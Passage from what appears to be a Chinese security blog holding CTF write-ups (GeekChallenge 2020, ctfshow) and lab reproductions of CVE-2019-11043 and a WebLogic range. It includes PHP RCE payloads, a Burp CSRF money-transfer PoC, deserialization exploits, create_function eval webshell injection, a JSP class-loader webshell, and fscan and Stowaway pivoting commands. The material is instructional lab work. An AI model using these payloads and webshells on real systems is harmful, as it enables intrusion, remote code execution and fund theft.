属性规定必需在提交之前填写输入字段。直接找到它把它删了，然后就成功登录了\n\n![image-20250111135849147](../image/achieve/202411/极客大挑战2020/image-20250111135849147.png)\n\n![image-20250111135917811](../image/achieve/202411/极客大挑战2020/image-20250111135917811.png)\n\n发现一个上传头像的地方，看看是不是文件上传漏洞\n\n发现可以上传，那我们这里可以将php文件打包成zip，改后缀名为jpg，再利用`zip`伪协议进行读取。zip协议是可以解压缩jpg后缀的压缩包的。\n\n先写一个木马文件，然后用zip压缩转成jpg文件后缀进行上传，上传成功后进行访问发现并不能看到图片(是因为我们这个文件是个压缩包，不是个正常的图片)\n\n![image-20250111141307731](../image/achieve/202411/极客大挑战2020/image-20250111141307731.png)\n\n利用zip伪协议读取一下\n\nzip:// + zip路径 + %23 + php文件名\n\n这里用%23去把源码中自动接上的php后缀去掉，然后传入参数执行命令就可以了\n\n![image-20250111142218492](../image/achieve/202411/极客大挑战2020/image-20250111142218492.png)\n\n# web-Rceme\n\n![image-20250111204504679](../image/achieve/202411/极客大挑战2020/image-20250111204504679.png)\n\n打开是一个命令执行界面\n\n![image-20250111204539582](../image/achieve/202411/极客大挑战2020/image-20250111204539582.png)\n\n可以看到里面有提示Do you know vim swp，意思是vim缓存信息泄露，访问.index.php.swp可以得到缓存文件，可以看到页面源码\n\n```php\n<?php\nerror_reporting(0);\nsession_start();\nif(!isset($_SESSION['code'])){\n        $_SESSION['code'] = substr(md5(mt_rand().sha1(mt_rand)),0,5);\n        //获得验证数字\n}\n \nif(isset($_POST['cmd']) and isset($_POST['code'])){\n \n        if(substr(md5($_POST['code']),0,5) !== $_SESSION['code']){\n                \n                die('<script>alert(\\'Captcha error~\\');history.back()</script>');\n        }\n        $_SESSION['code'] = substr(md5(mt_rand().sha1(mt_rand)),0,5);\n        $code = $_POST['cmd'];\n        if(strlen($code) > 70 or preg_match('/[A-Za-z0-9]|\\'|\"|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|<|>|\\$|\\?|\\^|&|\\|/ixm',$code)){\n                //修正符:x 将模式中的空白忽略; \n                die('<script>alert(\\'Longlone not like you~\\');history.back()</script>');\n        }else if(';' === preg_replace('/[^\\s\\(\\)]+?\\((?R)?\\)/', '', $code)){\n                @eval($code);\n                die();\n        }\n \n```\n\n简单来说就是\n\n1.code经过md5加密后的前5个字符要等于session 的code\n\n2.cmd长度不能超过70且不能被正则匹配到\n\n3.匹配括号内的内容替换成空格后结果为;\n\n使用的方法就是无数字字母rce，如果是函数套用的话只能满足第三个条件而不能满足第二个条件，所以我们只能用无数字字母rce的方法去实现函数套用\n\n无数字字母rce的话就是自增，取反，异或三种方法，但是自增的话可能满足不了长度的要求，异或的符号被过滤了，所以我们试一下取反去进行函数套用\n\n首先要通过第一个判断句\n\n## 哈希运算\n\n```python\nimport hashlib#用于进行哈希运算。MD5 是一种常用的哈希算法之一。\n\nfor i in range(1,10000000000000):\n    m=hashlib.md5(str(i).encode()).hexdigest()#计算字符串的 MD5 哈希值，并将结果转换为十六进制的字符串表示\n    if m[0:5]=='cfc86':\n        print(i)#如果找到符合条件的 i，则打印该整数。\n        break\n```\n\n运行结果\n\n![image-20250120234859048](../image/achieve/202411/极客大挑战2020/image-20250120234859048.png)\n\n可以得出252796的结果，也就是我们的code要传的参数，然后我们就用取反去进行rce\n\n先试一下phpinfo()\n\n![image-20250120231630388](../image/achieve/202411/极客大挑战2020/image-20250120231630388.png)\n\n在响应包中可以看到我们的php版本，在PHP7中支持这种调用方法，因此支持这么写('phpinfo')();例如\n\n```\n['phpinfo'][0]()\n['phpinfo']{0}()\n```\n\n也都是可以的\n\n```\nphpinfo(): [~%8F%97%8F%96%91%99%90][~%CF]();\n```\n\n加这个[~%FF]只是因为php7的解析方式，当然换成其他的也可以例如[~%EF] [~%CF]\n\n![image-20250120235942784](../image/achieve/202411/极客大挑战2020/image-20250120235942784.png)\n\nrce没成功，后面才知道是session的值交包后会更新，后面改了之后整了几次就整出来了\n\n![image-20250121000217160](../image/achieve/202411/极客大挑战2020/image-20250121000217160.png)\n\n```\nvar_dump(getallheaders());\n```\n\n`getallheaders()` 函数用于获取当前请求的所有 HTTP 头信息。\n\n因为有长度限制，不然想直接执行ls命令的函数套用来着\n\n因为ua头可控，所以我们这里可以通过ua去进行rce\n\n贴一个取反的脚本\n\n## 取反脚本poc\n\n```php\n<?php\n$ans1='getallheaders';//函数名\n$data1=('~'.urlencode(~$ans1));//通过两次取反运算得到结果\n\necho ('('.$data1.')'.';');\n```\n\npayload就是\n\n```\n[~%89%9E%8D%A0%9B%8A%92%8F][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]());\nuser-agent: ls /\n```\n\n看看ua头在哪个位置，但是好像我的ua头不在第二个位置，所以网上的wp用var_dump(next(getallheaders());打不了，重开靶机后也是这样，反正思路是对的\n\n# flagshop\n\n## #CSRF跨站请求伪造\n\n注册后登录在主页底下找到购买flag的按钮，但是显示钱不够\n\n![image-20250217233813121](../image/achieve/202411/极客大挑战2020/image-20250217233813121.png)\n\n然后在转账里面看到转账的入口，试着给自己转钱但是不可行\n\n![image-20250217234027610](../image/achieve/202411/极客大挑战2020/image-20250217234027610.png)\n\n![image-20250218124923898](../image/achieve/202411/极客大挑战2020/image-20250218124923898-1739854166953-1.png)\n\n后来看了wp才知道题目可以利用`CSRF`漏洞进行攻击，但是需要自己写一个页面让后台点击，接着会自动跳转到转账页面，让服务器以为是后台转账操作。\n\n假如我们写了一个恶意页面并提交报告上传，后台就会点击我们的报告，而我们页面的内容会进行自动跳转到转账页面，那接下来我们就写一下我们自己的CSRF恶意网页(这里是用的bp里的CSRF的poc)\n\n```html\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n    <form action=\"http://52235d31-9522-47f0-9ea9-8508a7a151f0.node5.buuoj.cn:81/transfer.php\" method=\"POST\" enctype=\"multipart/form-data\">//设置我们URL的表单提交\n      <input type=\"hidden\" name=\"target\" value=\"1\" />\n       <!--创建输入控件的 HTML 标签，允许用户输入数据,但是type属性设置字段类型为hidden，表示字段隐藏，也就是说，用户无法直接看到或修改这个字段的值-->\n      <input type=\"hidden\" name=\"money\" value=\"100000000000\" />\n      <input type=\"hidden\" name=\"messages\" value=\"1\" />\n      <input type=\"submit\" value=\"Submit request\" />\n      <!--这里意味着当我们提交报告的时候后台点击报告后会自动利用管理员身份提交表单进行转账，并做了一个隐藏的行为-->\n    </form>\n    <script>\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\n\n```\n\n```html\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://52235d31-9522-47f0-9ea9-8508a7a151f0.node5.buuoj.cn:81/transfer.php\" method=\"POST\" enctype=\"multipart/form-data\">\n      <input type=\"hidden\" name=\"target\" value=\"qwasd\" />\n      <input type=\"hidden\" name=\"money\" value=\"1000000000000000000000000000000000000000000000000000000\" />\n      <input type=\"hidden\" name=\"messages\" value=\"123\" />\n      <input type=\"submit\" value=\"Submit request\" id=\"onclick_1\" />\n    </form>\n    <script type=\"text/javascript\">\n      document.getElementById(\"onclick_1\").click();\n    </script>\n  </body>\n</html>\n```\n\n![image-20250218002000777](../image/achieve/202411/极客大挑战2020/image-20250218002000777.png)\n\n解释一下第一个exp的那段js代码\n\n**`history.pushState('', '', '/');`**：\n\n- **`history` 对象**：这是浏览器提供的一个 API，允许你操控浏览器的历史记录。开发者可以使用它来添加、修改或删除历史记录条目。\n\n- `pushState()` 方法\n\n  ：这个方法用于将一个新的状态记录到浏览器的历史记录栈中。它有三个参数：\n\n  - **第一个参数**（`''`）：表示状态对象，这里是一个空字符串，通常可以用来存储与状态相关的数据。\n  - **第二个参数**（`''`）：表示标题，这里也是一个空字符串。大多数浏览器目前会忽略这个参数。\n  - **第三个参数**（`'/'`）：表示新的 URL。这会改变浏览器地址栏中显示的 URL，但不会导致页面重新加载。在这个例子中，URL 被设置为根路径 `'/'`。\n\n说白了这里将当前页面的URL设置为'/'但不会引起页面刷新。是一种掩盖我们攻击的时候提交恶意请求的实际URL\n\n**`document.forms[0].submit();`**：\n\n- **`document.forms`**：这是一个包含文档中所有表单的集合，`document.forms[0]` 获取第一个表单元素（在这个例子中是 `<form>` 标签）。\n- **`.submit()` 方法**：这是一个 JavaScript 方法，用于程序matically 提交表单。调用这个方法时，浏览器会自动执行表单的提交操作，发送表单数据到指定的 `action` URL。\n\n上传报告的地方可以上传，但是需要爆破验证码\n\n![image-20250218002143051](../image/achieve/202411/极客大挑战2020/image-20250218002143051.png)\n\n## 贴个MD5截断加密的解密脚本\n\n```python\n#-*- coding: utf-8 -*-\n#!/usr/bin/env/python\nfrom multiprocessing.dummy import Pool as tp\nimport hashlib\n\nknownMd5 = '6fb05'      #已知的md5明文\ndef md5(text):\n    return hashlib.md5(str(text).encode('utf-8')).hexdigest()\n\ndef findCode(code):\n    key = code.split(':')\n    start = int(key[0])\n    end = int(key[1])\n    for code in range(start, end):\n        if md5(code)[0:5] == knownMd5:\n            print(code)\n            break\nlist=[]\nfor i in range(3):    #这里的range(number)指爆破出多少结果停止\n    list.append(str(10000000*i) + ':' + str(10000000*(i+1)))\npool = tp()    #使用多线程加快爆破速度\npool.map(findCode, list)\npool.close()\npool.join()\n```\n\n![image-20250218002817953](../image/achieve/202411/极客大挑战2020/image-20250218002817953.png)\n\n解密出来后在自己的web网站目录下放一个CSRF页面然后提交报告就可以了，我是放在我的远程服务器里头的\n\n```\n报告主题:BUG\n\n验证码:爆破出来的\n\n报告内容:http://服务器IP/1.html\n```\n\n其实本来是可以出来的，但是不知道为啥buuctf的这道题的环境可能有问题一直出不来，所以了解思路就可以了\n\n# Greatphp\n\n```php\n<?php\nerror_reporting(0);\nclass SYCLOVER {\n    public $syc;\n    public $lover;\n\n    public function __wakeup(){\n        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){\n           if(!preg_match(\"/\\<\\?php|\\(|\\)|\\\"|\\'/\", $this->syc, $match)){\n               eval($this->syc);\n           } else {\n               die(\"Try Hard !!\");\n           }\n           \n        }\n    }\n}\n\nif (isset($_GET['great'])){\n    unserialize($_GET['great']);\n} else {\n    highlight_file(__FILE__);\n}\n\n?>\n```\n\n反序列化的题目，只有一个wakeup方法里面的eval函数可以使用，看php版本是7.2.25，先分析一下里面的if语句\n\n1.需要让这两个成员变量不相等且md5值和sha1值相等\n\n2.绕过正则匹配，匹配字符为`'<?php',左右括号,单引号,双引号`\n\n本来以为是一个正常的php绕过，但是强碰撞去绕过md5验证的话很难传入我们的rce危险函数\n\n在类里，无法用数组进行md5绕过，然后学到一个新姿势就是用原生类进行绕过\n\n**这里我们可以使用原生类Error或者Exception，只不过 Exception 类适用于PHP 5，7和8，而 Error 只适用于 PHP 7和8。**\n\n## Exception原生类\n\n(PHP 5, PHP 7, PHP 8)\n\n**Exception**是所有用户级异常的基类。\n\n关于类的摘要\n\n![image-20250218163230150](../image/achieve/202411/极客大挑战2020/image-20250218163230150.png)\n\n属性:\n\n- message\n\n  异常消息内容\n\n- code\n\n  异常代码\n\n- file\n\n  抛出异常的文件名\n\n- line\n\n  抛出异常在该文件中的行号\n\n- previous\n\n  之前抛出的异常\n\n- string\n\n  字符串形式的堆栈跟踪\n\n- trace\n\n  数组形式的堆栈跟踪\n\n各种方法的解释\n\n![image-20250218163448507](../image/achieve/202411/极客大挑战2020/image-20250218163448507.png)\n\n## Error原生类\n\n(PHP 7, PHP 8)\n\n**Error** 是所有PHP内部错误类的基类。\n\n关于类的摘要\n\n![image-20250218163346610](../image/achieve/202411/极客大挑战2020/image-20250218163346610.png)\n\n属性\n\n- message\n\n  错误消息内容\n\n- code\n\n  错误代码\n\n- file\n\n  抛出错误的文件名\n\n- line\n\n  抛出错误的行数\n\n- previous\n\n  之前抛出的异常\n\n- string\n\n  字符串形式的堆栈跟踪\n\n- trace\n\n  数组形式的堆栈跟踪\n\n各种方法的解释\n\n![image-20250218163427394](../image/achieve/202411/极客大挑战2020/image-20250218163427394.png)\n\n接下来我们拿Error类在本地做一下测试进行讲解，Exception类和这个大差不差\n\n```php\n<?php\n$a=new Error(\"payload\",1);\n$b=new Error(\"payload\",2);\necho $a;\necho $b;\nif ($a!=$b){\n\techo \"不相等\";\n}\nif (md5($a)===md5($b)){\n\techo \"md5相等\";\n}\nif (sha1($a)===sha1($b)){\n\techo \"sha1相等\";\n}\n?>\n    /*\nError: payload in E:\\vscode\\profiles\\1.php:2\nStack trace:\n#0 {main}Error: payload in E:\\vscode\\profiles\\1.php:3\nStack trace:\n#0 {main}不相等\n*/\n```\n\n这里可以看到是成功满足了不相等的条件的，\n\n在 PHP 中，`$a` 和 `$b` 是两个不同的对象实例，尽管它们的构造函数接收的参数相同（即都为 `\"payload\"`），但它们的错误代码不同（`$a` 的错误代码为 `1`，而 `$b` 的错误代码为 `2`）。\n\n在 PHP 中，当您比较两个对象时，使用 `!=` 或 `!==` 运算符会比较对象的实例\n\n1. **引用比较**：如果两个对象引用的是同一个实例（即它们是同一个对象），那么它们是相等的。\n2. **内容比较**：如果两个对象是不同的实例（即它们是不同的对象），即使它们的属性具有相同的值，PHP 仍然会认为它们是不相等的\n\n因此，这两个对象被认为是不相等的。但是后面两个条件没满足，没满足md5的验证。这时候我们如果设置为同一行呢\n\n```php\n<?php\n$a=new Error(\"payload\",1);$b=new Error(\"payload\",2);\necho $a.\"\\n\";\necho $b.\"\\n\";\nif ($a!=$b){\n\techo \"不相等\\n\";\n}\nif (md5($a)===md5($b)){\n\techo \"md5相等\\n\";\n}\nif (sha1($a)===sha1($b)){\n\techo \"sha1相等\\n\";\n}\n?>\n/*\nError: payload in E:\\vscode\\profiles\\1.php:2\nStack trace:\n#0 {main}\nError: payload in E:\\vscode\\profiles\\1.php:2\nStack trace:\n#0 {main}\n不相等\nmd5相等\nsha1相等\n*/\n```\n\n这时候他们的md5和sha1是一样的,且他们的值是不一样的，因为md5和sha1比较的是\n\n`Error: payload in E:\\vscode\\profiles\\1.php:2\nStack trace:\n#0 {main}`\n\n由于它们在同一行中被执行，若在此行代码中发生错误，错误指向的行数仅会标记为当前的行，即行号 2，这时候他们的内容完全相等，所以他们的md5值也会相等\n\n理清楚之后我们就开始打吧\n\n因为eval执行带有完整标签的语句需要先闭合，就类似于将字符串当成代码写入到源码中。\n\n由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接`include \"/flag\"`将flag包含进来即可；由于过滤了引号，于是在这里进行取反，这样解码后就自动是**字符串**，无需再加双引号或单引号。\n\n```php\n<?php\nclass SYCLOVER {\n    public $syc;\n    public $lover;\n\n    public function __wakeup(){\n        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){\n           if(!preg_match(\"/\\<\\?php|\\(|\\)|\\\"|\\'/\", $this->syc, $match)){\n               eval($this->syc);\n           } else {\n               die(\"Try Hard !!\");\n           }\n           \n        }\n    }\n}\n$payload=\"?><?=include~\".urldecode(\"%d0%99%93%9e%98\").\"?><?\";\n$a=new Error($payload,1);$b=new Error($payload,2);\n$c = new SYCLOVER();\n$c->syc = $a;\n$c->lover = $b;\necho urlencode(serialize($c));\n?>\n```\n\n# FighterFightsInvincibly\n\n源码中有\n\n```\n<!-- $_REQUEST['fighter']($_REQUEST['fights'],$_REQUEST['invincibly']); -->\n```\n\n这个格式很像是**变量函数**的格式\n\n- 在PHP中，如果一个变量名后跟括号，PHP会尝试将该变量的值作为函数名来调用。\n\n```\n函数名(形参1,形参2);\n```\n\n一开始传入?fighter=system&fights=whoami&invincibly=构造\n\n```\nsystem(\"whoami\", \"\");\n```\n\n但是没看到执行\n\n还有一个思路就是利用creat_function\n\n## creat_function()函数\n\ncreate_function()主要用来通过执行代码字符串创建动态函数\n\n本函数已自 PHP 7.2.0 起被*废弃*，并自 PHP 8.0.0 起被*移除*。\n\n基本格式\n\n```\ncreate_function(string $args, string $code): string\n```\n\n官方的例子\n\n```php\n<?php\n$newfunc = create_function('$a,$b', 'return \"ln($a) + ln($b) = \" . log($a * $b);');\necho $newfunc(2, M_E) . \"\\n\";\n?>\n//ln(2) + ln(2.718281828459) = 1.6931471805599\n```\n\n其实构造出来的函数是这样的\n\n```php\nfunction($a,$b){\n    return \"ln($a) + ln($b) = \" . log($a * $b);\n}\n```\n\n然后我们如何利用这个函数呢？在web目录下写一个1.php做测试\n\n```php\n<?php\nhighlight_file(__FILE__);\n$id=$_GET['id'];\n$str2=$id;\necho $str2;\n$f1 = create_function('$a',$str2);\n?>\n```\n\n此时如果我们传入\n\n```php\n$str2=echo \"test\";\n```\n\n那么构造出来的结果就是\n\n```php\nfunction($a){\n    echo \"test\";\n}\n```\n\n![image-20250324201553670](../image/achieve/202411/极客大挑战2020/image-20250324201553670.png)\n\n但是如果我们传入\n\n```php\n$str2 = echo \"test\";}phpinfo();/*\n```\n\n那么构造出来的结果就是\n\n```php\nfunction($a){\n    echo \"test\";\n\t}\nphpinfo();/*\n}\n```\n\n![image-20250324201642213](../image/achieve/202411/极客大挑战2020/image-20250324201642213.png)\n\n说明是可以进行代码执行的，那我们回到题目中去构造\n\n```\n?fighter=create_function&fights=&invincibly=;}phpinfo();/*\n```\n\n页面上没有但是在源码中看到了内容\n\n![image-20250324202105259](../image/achieve/202411/极客大挑战2020/image-20250324202105259.png)\n\n需要绕过disable_function，那我们写eval然后蚁剑连\n\n```\n?fighter=create_function&fights=&invincibly=;}eval($_POST['cmd']);/*\n```\n\n连上后绕过disable_function\n\n![image-20250324203657554](../image/achieve/202411/极客大挑战2020/image-20250324203657554.png)\n\n但是这里好像flag少了\n","tags":["极客大挑战2020"],"categories":["赛题wp"]},{"title":"CVE-2019-11043漏洞复现","url":"/2025/03/24/CVE-2019-11043漏洞复现/","content":"\n## 漏洞信息\n\n### **漏洞描述**\n\nNginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \\n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。\n\n### **利用条件：**\n\nnginx配置了fastcgi_split_path_info\n\n### **受影响系统：**\n\nPHP 5.6-7.x，Nginx>=0.7.31\n\n那我们先来看一下nginx.conf中的具体配置\n\n```\nlocation ~ [^/]\\.php(/|$) {\n\n ...\n\n fastcgi_split_path_info ^(.+?\\.php)(/.*)$;\n\n fastcgi_param PATH_INFO $fastcgi_path_info;\n\n fastcgi_pass   php:9000;\n\n ...\n\n}\n```\n\n解释一下\n\n```\nfastcgi_split_path_info ^(.+?\\.php)(/.*)$;\n```\n\n这一行将请求 URI 分割为两部分：\n\n- 第一个捕获组 `(.+?\\.php)` 匹配以 `.php` 结尾的最短路径，作为脚本文件名\n- 第二个捕获组 `(/.*)`匹配剩余的路径信息\n- 结果会被存储在 `$fastcgi_script_name` 和 `$fastcgi_path_info` 变量中\n\n用的是非贪婪匹配 (`+?`)，这样可以确保只匹配到第一个找到的 `.php` 文件。\n\n1. `fastcgi_param PATH_INFO $fastcgi_path_info;`\n\n这一行将 Nginx 解析出的路径信息传递给 PHP-FPM，作为 `PATH_INFO` 环境变量。PHP 可以通过 `$_SERVER['PATH_INFO']` 访问这个值。\n\n此时我们可以使用换行符（％0a）来破坏`fastcgi_split_path_info`指令中的Regexp。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。\n\n## 漏洞复现\n\n### 安装docker，golang环境\n\n```\nsudo apt update\nsudo apt upgrade\nsudo apt-get install docker docker-compose\nsudo apt install golang\n```\n\n### 搭建漏洞环境\n\n```\ngit clone http://github.com/vulhub/vulhub.git\ncd vulhub/php/CVE-2019-11043\ndocker-compose up -d\n```\n\n搭建好后我们访问`http://[远程服务器IP]:8080/index.php`\n\n![image-20250324111925652](../image/achieve/202411/CVE复现/image-20250324111925652.png)\n\n搭建成功！\n\n然后我们安装漏洞利用工具phuip-fpizdam\n\nphuip-fpizdam 是一个用于利用 PHP-FPM (FastCGI Process Manager) 中的一个安全漏洞的漏洞利用工具\n\n### 安装漏洞利用工具\n\n安装工具可以换个目录去安装~\n\n```\ngit clone https://github.com/neex/phuip-fpizdam.git\ncd phuip-fpizdam\ngo get -v && go build\n```\n\n运行这个工具试一下\n\n```\n./phuip-fpizdam\n```\n\n![image-20250324112122846](../image/achieve/202411/CVE复现/image-20250324112122846.png)\n\n### 开始复现\n\n工具一把梭\n\n```\ngo run . \"http://[ip]:8080/index.php\"\n```\n\n![image-20250324112208089](../image/achieve/202411/CVE复现/image-20250324112208089.png)\n\n解释一下\n\n1. **Success! Was able to execute a command by appending \"?a=/bin/sh+-c+'which+which'&\" to URLs**：攻击成功了，攻击者通过在请求URL中添加特定的命令参数(`?a=/bin/sh+-c+'which+which'&`)成功执行了一个命令。这表明攻击者能够通过该漏洞远程执行代码。\n2. **Trying to cleanup /tmp/a...**：攻击者尝试清理临时文件或目录，以去除攻击痕迹。\n\n在初始利用之后，webshell被注入PHP-FPM进程。然后我们可以执行命令\n\n然后我们传入\n\n```\n?a=id\n```\n\n注意，因为php-fpm会启动多个子进程，在访问/index.php?a=id时需要多访问几次，以访问到被污染的进程。\n\n![image-20250324112408637](../image/achieve/202411/CVE复现/image-20250324112408637.png)\n\n继续传入\n\n```\n?a=whoami\n```\n\n![image-20250324112544398](../image/achieve/202411/CVE复现/image-20250324112544398.png)\n\n已经成功拿到shell可执行命令了\n","tags":["漏洞复现"],"categories":["CVE"]},{"title":"记一次weblogic-10.3.6.0靶场漏洞利用","url":"/2025/03/23/weblogic漏洞靶场复现/","content":"\n# 0x01前言\n\n一开始工具跑不起来，后面才发现是原先的java版本太高了，整了个java8才跑起来\n\n# 0x02复现\n\n准备工具：WeblogicTool 1.2\n\n环境靶场：http://119.45.164.136:7001/\n\ndirsearch扫不出目录，但是看着cve的话就直接访问管理控制台了\n\n## 外网探测\n\nhttp://119.45.164.136:7001/console/login/LoginForm.jsp\n\n![image-20250323192049180](../image/achieve/202411/CVE复现/image-20250323192049180.png)\n\n利用工具进行扫描\n\n![image-20250323192129192](../image/achieve/202411/CVE复现/image-20250323192129192.png)\n\nCVE_2016_0638_ECHO漏洞，老漏洞了\n\n删掉端口后面多余字符，输入/uddiexplorer/\n\n![image-20250323192228090](../image/achieve/202411/CVE复现/image-20250323192228090.png)\n\n随便在右上角找了一个图片的路径\n\n```\nhttp://119.45.164.136:7001/uddiexplorer/help.gif\n```\n\n复制图片文件名 到weblogic中用命令去查找\n\n```\nfind ./ -name help.gif\n```\n\n![image-20250323192347356](../image/achieve/202411/CVE复现/image-20250323192347356.png)\n\n然后我们pwd看一下当前的目录\n\n```\n/root/Oracle/Middleware/user_projects/domains/base_domain\n```\n\n然后拼接一下路径\n\n```\n/root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/5f6ebw/war/\n```\n\n这个路径就是我们可以上传文件的路径\n\n因为是java的环境，所以我们需要写jsp的木马\n\n```jsp\n<%!\n    class U extends ClassLoader {\n        U(ClassLoader c) {\n            super(c);\n        }\n        public Class g(byte[] b) {\n            return super.defineClass(b, 0, b.length);\n        }\n    }\n \n    public byte[] base64Decode(String str) throws Exception {\n        try {\n            Class clazz = Class.forName(\"sun.misc.BASE64Decoder\");\n            return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str);\n        } catch (Exception e) {\n            Class clazz = Class.forName(\"java.util.Base64\");\n            Object decoder = clazz.getMethod(\"getDecoder\").invoke(null);\n            return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str);\n        }\n    }\n%>\n<%\n    String cls = request.getParameter(\"passwd\");\n    if (cls != null) {\n        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);\n    }\n%>\n```\n\n然后密码是passwd\n\n## 提权\n\n用蚁剑连，然后用插件进行提权，这里队友做过了我就不做了\n\n## 内网穿透\n\nifconfig看ip\n\n![image-20250323193436352](../image/achieve/202411/CVE复现/image-20250323193436352.png)\n\n在tmp目录里上传个fscan，给777权限然后扫内网ip\n\n```\n./fscan -h 172.16.10.0/24\n```\n\n```\n#Halo AntSword!172.16.10.1:6379 open\n172.16.10.1:80 open\n172.16.10.1:22 open\n172.16.10.1:8082 open\n172.16.10.1:8848 open\n172.16.10.1:7001 open\n172.16.10.1:8081 open\n172.16.10.8:7001 open\n[*] WebTitle http://172.16.10.1        code:200 len:1925   title:Hello!\n[*] WebTitle http://172.16.10.1:8081   code:200 len:11215  title:Apache Tomcat/11.0.5\n[*] WebTitle http://172.16.10.1:8848   code:404 len:431    title:HTTP Status 404 – Not Found\n[*] WebTitle http://172.16.10.1:8082   code:200 len:15928  title:BEES企业网站管理系统_企业建站系统_外贸网站建设_企业CMS_PHP营销企业网站�\n[+] PocScan http://172.16.10.1:8848 poc-yaml-alibaba-nacos \n[+] PocScan http://172.16.10.1:8848 poc-yaml-alibaba-nacos-v1-auth-bypass \n[+] Redis 172.16.10.1:6379 unauthorized file:/data/module.so\n[*] WebTitle http://172.16.10.1:7001   code:404 len:1164   title:Error 404--Not Found\n[*] WebTitle http://172.16.10.8:7001   code:404 len:1164   title:Error 404--Not Found\n[+] InfoScan http://172.16.10.8:7001   [weblogic] \n[+] InfoScan http://172.16.10.1:7001   [weblogic] \n[+] PocScan http://172.16.10.1:7001 poc-yaml-weblogic-cve-2020-14750 \n[+] PocScan http://172.16.10.8:7001 poc-yaml-weblogic-cve-2020-14750 \n[+] PocScan http://172.16.10.1:7001 poc-yaml-weblogic-cve-2019-2729-1 \n[+] PocScan http://172.16.10.1:7001 poc-yaml-weblogic-ssrf \n[+] PocScan http://172.16.10.8:7001 poc-yaml-weblogic-ssrf \n[+] PocScan http://172.16.10.8:7001 poc-yaml-weblogic-cve-2019-2729-1 \n[+] PocScan http://172.16.10.8:7001 poc-yaml-weblogic-cve-2019-2729-2 \n[+] PocScan http://172.16.10.1:7001 poc-yaml-weblogic-cve-2019-2729-2 \n[+] PocScan http://172.16.10.1:7001 poc-yaml-weblogic-cve-2019-2725 v10\n[+] PocScan http://172.16.10.8:7001 poc-yaml-weblogic-cve-2019-2725 v10\n```\n\n接下来就是搭建代理了，上传一个stowaway的agent\n\n给权限然后搭建代理\n\n攻击机(我的服务器)\n\n```\n./linux_x64_admin -l 9999\n```\n\n靶机\n\n```\n./linux_x64_agent -c IP:9999\n```\n\n![image-20250323195405877](../image/achieve/202411/CVE复现/image-20250323195405877.png)\n\n然后输入\n\n```\nuse 0\nsocks 5555\n```\n\n然后在浏览器中配置代理就行\n\n## EES企业网站管理系统\n\n访问http://172.16.10.1:8082，BEES企业网站管理系统_企业建站系统_外贸网站建设_企业CMS_PHP营销企业网站\n\n发现这个隧道搭建的特别不稳定。。。拿到了poc但是做不了\n","tags":["漏洞复现"],"categories":["CVE"]},{"title":"ctfshow月饼杯(已做完)","url":"/2025/03/23/ctfshow月饼杯(已做完)/","content":"\n# web1_此夜圆\n\n***一江春水何年尽，万古清光此夜圆***\n\n## #反序列化字符串逃逸\n\n有附件，下下来看看\n\n```php\n<?php\nerror_reporting(0);\n\nclass a\n{\n\tpublic $uname;\n\tpublic $password;\n\tpublic function __construct($uname,$password)\n\t{\n\t\t$this->uname=$uname;\n\t\t$this->password=$password;\n\t}\n\tpublic function __wakeup()\n\t{\n\t\t\tif($this->password==='yu22x')\n\t\t\t{\n\t\t\t\tinclude('flag.php');\n\t\t\t\techo $flag;\t\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\techo 'wrong password';\n\t\t\t}\n\t\t}\n\t}\n\nfunction filter($string){\n    return str_replace('Firebasky','Firebaskyup',$string);\n}\n\n$uname=$_GET[1];\n$password=1;\n$ser=filter(serialize(new a($uname,$password)));\n$test=unserialize($ser);\n?>\n```\n\n看到replace替换就猜到是字符串逃逸了\n\n需要让password为yu22x，但是这里只有uname是可控的，所以uname里的字符串就是需要传入的字符串\n\n字符增多的逃逸\n\n- 需要逃逸的字符\n\n\n```\n\";s:8:\"password\";s:5:\"yu22x\";}\n```\n\n- 那我们的反序列化前的字符串就是\n\n```\nO:1:\"a\":2:{s:5:\"uname\";s:1:\"\";s:8:\"password\";s:5:\"yu22x\";}\";s:8:\"password\";i:1;}\n```\n\n- `\";s:8:\"password\";s:5:\"yu22x\";}`个数是30\n\n因为传入Firebasky会被替换成Firebaskyup，多出两个字符，那么我们希望多出30个字符把需要逃逸的字符挤出去，那就需要传入15个Firebasky\n\n那最终需要构造出来的字符串就是\n\n```\nO:1:\"a\":2:{s:5:\"uname\";s:1:\"FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky\";s:8:\"password\";s:5:\"yu22x\";}\";s:8:\"password\";s:1:\"1\";}\n```\n\npayload\n\n```\n?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky\";s:8:\"password\";s:5:\"yu22x\";}\n```\n\n# web2_故人心\n\n***三五夜中新月色，二千里外故人心***\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$a=$_GET['a'];\n$b=$_GET['b'];\n$c=$_GET['c'];\n$url[1]=$_POST['url'];\nif(is_numeric($a) and strlen($a)<7 and $a!=0 and $a**2==0){\n    $d = ($b==hash(\"md2\", $b)) && ($c==hash(\"md2\",hash(\"md2\", 